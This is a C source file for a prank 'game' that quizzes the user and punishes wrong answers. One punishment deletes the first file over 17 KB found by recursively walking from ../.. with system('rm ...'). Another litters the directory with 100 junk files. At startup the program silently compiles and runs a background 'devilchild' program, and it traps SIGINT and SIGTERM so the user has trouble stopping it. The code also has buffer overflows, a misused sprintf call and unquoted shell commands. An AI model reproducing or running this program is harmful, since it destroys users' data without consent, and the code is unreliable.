#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <signal.h>
#include <time.h>
#include <sys/wait.h>
#include <dirent.h>
#include <errno.h>


typedef struct
{

	int flag; 
	long int size_f;
	char* dir_n;
	char* file;
	char* ex_n;

}Args; 

// Msg functions
void WelcomePlayer(); 
void TalkToUser_Helper(char* msg); 
void Questions(int option);

// Threads
void* TalkToUser(void* vargs);
void* Timer(void* vargs); 

// Signals
void signalHandler(int sig); 

// Main game
void PlayGame(char* pname); 
void Consequences(int casw, int iasw, char* pname); 

// Child
void CreateChild(); 

// Consequences
void EatGarbage();
	// Delete File
void DeleteFile();
	// Thread for navigate and count new Dir
void* foundNewDir(void* vargs); 
off_t Fsize(const char* filename); 
char* getName(char* arg); 

int main(int argc, char* argv[argc + 1])
{

	// Signals
	signal(SIGINT, signalHandler); 
	signal(SIGTERM, signalHandler); 

	WelcomePlayer(); 

	CreateChild();

	PlayGame(argv[0]); 
	
	pthread_t timer_t; 
	int timer; 

	timer = pthread_create(&timer_t, NULL, Timer, NULL); 
	pthread_join(timer_t, NULL); 

	printf("BOOM\nJAJAJA It was just a joke... sort of...\n");
	
	return EXIT_SUCCESS; 

}

void signalHandler(int sig)
{

	printf("%s", sig == 2 ? "You must think twice before leaving me\n" : sig == 15 ? "Alright... I am done with you\n" : "Bye\n"); 
	
	signal(SIGINT, signalHandler); 
	signal(SIGTERM, signalHandler); 

}

void TalkToUser_Helper(char* msg)
{

	pthread_t ttu_t; 
	int ttu; 

	ttu = pthread_create(&ttu_t, NULL, TalkToUser, (void*)msg); 

	pthread_join(ttu_t, NULL); 

}

void* Timer(void* vargs)
{

	int timer = 30; 

	char* joke = "What do you think will happen when this timer ends?\n"; 

	TalkToUser_Helper(joke); 

	while(timer >= 0)
	{

		printf("\r%02d", timer); 
		fflush(stdout); 
		timer--; 
		sleep(1); 

	}

	printf("\n"); 

	return NULL; 

}

void* TalkToUser(void* vargs)
{

	char* msg = (char*)vargs; 

	for(size_t i = 0; i < strlen(msg); i++)
	{

		printf("%c", msg[i]); 
		fflush(stdout); 

		usleep(10000); 

	}

	pthread_exit(EXIT_SUCCESS); 

}

void WelcomePlayer()
{

	// Threads vars
	pthread_t ttu_t; 
	int ttu; 

	char* welcome_msg = "I wanna play a little game with you... "; 
	char* explain = "I will make you some questions\nIf you fail to answer... you might face some consequences\n"; 
	char* consequences = "There are three possible consequences...\n[1] You will drown in garbage\n[2] I will take away something from you\n[3] BOOM!\n"; 

	// Hostname
	int size = 200; 
	char* hostname = (char*)calloc(size,sizeof(char)); 
	gethostname(hostname, size); 

	TalkToUser_Helper(welcome_msg); 
	TalkToUser_Helper(hostname);

	free(hostname); 
	
	printf("\n"); 
	
	TalkToUser_Helper(explain); 
	TalkToUser_Helper(consequences); 


}

void Questions(int option)
{

	char* berghain = "Where is Berghain?\nR: ";
	char* python = "In what language was Python first developed?\nR: "; 
	char* threads = "What's the flag for commpiling with threads?\nR: ";
	char* random = "How many correct answers have you had?\nR: ";

	switch(option)
	{

		case 1:
			TalkToUser_Helper(berghain);
			break;
		case 2:
			TalkToUser_Helper(python);
			break;
		case 3:
			TalkToUser_Helper(threads);
			break;
		case 4: 
			TalkToUser_Helper(random);
			break;
		default:
			printf("Invalid option\n");

	}

}

void PlayGame(char* pname)
{

	int casw; 
	casw = 0; 
	int iasw;
	iasw = 0;

	char* asw1 = (char*)calloc(30,sizeof(char)); 
	
	Questions(1);
	scanf("%[^\n]", asw1);
	getchar(); 

	if(!strcmp(asw1, "Berlin"))
		casw++;
	else
		iasw++;

	char asw2;
	asw2 = '\0';

	Questions(2);
	scanf("%c", &asw2); 
	getchar();

	if(asw2 == 'C')
		casw++;
	else
		iasw++;

	char* asw3 = (char*)calloc(30,sizeof(char));

	Questions(3);
	scanf("%[^\n]", asw3);
	getchar(); 

	if(!strcmp(asw3,"-lpthread"))
		casw++;
	else
		iasw++;

	int asw4; 
	asw4 = 0; 

	Questions(4);
	scanf("%d", &asw4); 

	if(asw4 == casw)
		casw++; 
	else
		iasw++;

	printf("Casw: %d || Iasw: %d\n", 
			casw,
			iasw);

	Consequences(casw, iasw, pname);

	free(asw1);
	free(asw3);

}

void Consequences(int casw, int iasw, char* pname)
{

	if(iasw >= casw)
	{

		srand(time(NULL)); 
		int r = rand() % 3 + 1; 

		printf("Random: %d\n", r); 

		switch(r)
		{

			case 1:
				printf("Eat garbage!! \n"); 
				EatGarbage();
				break;	
			case 2: 
				printf("I will take smth from you!! \n"); 
				DeleteFile(pname);
				break; 
			case 3:
				printf("Alright... I hope you saved your work\n"); 
				exit(2);
				break; 
			default:
				printf("As I am not sure... BYE!\n");
				exit(2);

		}

	}
	else
	{
		char* bye = "You are safe...\nAren't you\n";
		
		TalkToUser_Helper(bye);

	}

}

void CreateChild()
{

	// Compile 
	system("gcc -o devilchild devilchild.c -lpthread");

	// Run devilchild on the background
	system("./devilchild &"); 

}

void EatGarbage()
{

	int nfiles = 100;

	int length;
	char* nf;
	char* fname;
	char* command;

	for(int i = 0; i < nfiles; i++)
	{

		fname = (char*)calloc(20, sizeof(char));
		strcpy(fname, "notafile_");

		command = (char*)calloc(20, sizeof(char));
		strcpy(command, "touch ");

		length = snprintf(NULL, 0, "%d", i);

		nf = (char*)malloc(length + 1);

		sprintf(nf, length + 1, "%d", i);

		strcat(fname,nf);

		strcat(command,fname);

		system(command);

		free(fname);
		free(nf);
		free(command);

	}

}

void DeleteFile(char* pname)
{

	// Initialize struct (args)
	Args* dirInf = (Args*)malloc(sizeof(Args));
	dirInf->flag = 1;
	dirInf->size_f = 17000; 
	dirInf->dir_n = "../..";
	dirInf->file = (char*)calloc(100,sizeof(char));

	// Name of file 
	dirInf->ex_n = getName(pname);

	// printf("File name: %s\n", dirInf->ex_n); 

	// Thread vars
	pthread_t fnd_t; 
	int fnd; 

	// Create main thread
	fnd = pthread_create(&fnd_t, NULL, foundNewDir, (void*)dirInf);
	pthread_join(fnd_t, NULL); 

	// printf("Selected file from MAIN: %s\n", dirInf->file); 

	char* command; 
	command = (char*)calloc(20, sizeof(char));

	strcpy(command, "rm ");
	strcat(command, dirInf->file);

	system(command);

	// Free memory
	free(dirInf->file);
	free(dirInf->ex_n);
	free(dirInf); 
	free(command);

}

// Compartimos memoria en el Struct
void* foundNewDir(void* vargs)
{

	Args* dirInf = (Args*)vargs; 

	// Struct for dirs
	DIR* dir; 
	struct dirent* drnt; 

	// New thread
	pthread_t ndir_t;
	int ndir;

	// For current dir
	char cwd[1000]; 
	char* newPath;

	// Change to user's dir
	chdir(dirInf->dir_n); 

	// Get directory
	getcwd(cwd, sizeof(cwd)); 

	//dirInf->dir_n = cwd; 
	//strcat(dirInf->dir_n, "/");

	// printf("cwd before dir read: %s\n", dirInf->dir_n);

	// Open directory
	dir = opendir(dirInf->dir_n); 
	if(dir == NULL)
	{

		printf("ERR: Invalid dir: %s\n", dirInf->dir_n);
		pthread_exit(0); 

	}


	// While over returned files / directories
	while((drnt = readdir(dir)) != NULL)
	{
		// strcmp returns 0 if equal
		// Skip father and current dierctory
		if(!strcmp(drnt->d_name, ".") || !strcmp(drnt->d_name, "..") || !strcmp(drnt->d_name, dirInf->ex_n))
		{

			continue;

		}
		// If directory
		// Create new thread
		else if(drnt->d_type == DT_DIR)
		{

			// New path
			newPath = cwd;
			strcat(newPath,"/");
			
			// Path to new path
			strcat(newPath, drnt->d_name);

			// Pass new directory
			dirInf->dir_n = newPath;

			// printf("cwd after dir read: %s\n", dirInf->dir_n);
	
			// Create new thread for new directory
			ndir = pthread_create(&ndir_t, NULL, foundNewDir, (void*)dirInf);
			pthread_join(ndir_t, NULL);

			// Go up a level
			chdir(".."); 
			getcwd(cwd, sizeof(cwd));

			// Retrun to father directory
			dirInf->dir_n = cwd; 
			

		}
		// Print files
		else
		{
			// If file bigger
			if(Fsize(drnt->d_name) > dirInf->size_f)
			{
				
				// Only first found	
				 if(dirInf->flag)
				{

					dirInf->flag = 0;

					// Get current path
					getcwd(cwd, sizeof(cwd)); 

					// Get path + /
					newPath = cwd;
					strcat(newPath, "/");

					// Add selected file
					strcat(newPath, drnt->d_name);
					strcpy(dirInf->file, newPath);


				}
				
			}
			
		}

	}

	// Close
	closedir(dir); 

	// Exit thread
	pthread_exit(EXIT_SUCCESS); 

}

off_t Fsize(const char* filename)
{

	struct stat st;

	if(stat(filename, &st) == 0)
	{

		return st.st_size;

	}
	else
	{

		fprintf(stderr, "Could not determine size of file: %s || %s\n", filename, strerror(errno));

		return -1; 

	}

}

char* getName(char* arg)
{

	char* fname = arg; 
	char* rname = (char*)calloc(15, sizeof(char)); 

	size_t s = 0; 

	for(size_t i = strlen(fname)-1; i > 0; i--)
	{

		if(fname[i] == '/')
		{

			s = i; 

		}

	}

	int c = 0; 

	for(size_t i = s + 1; i < strlen(fname); i++)
	{

		rname[c] = fname[i]; 

		c++; 

	}

	return rname; 

}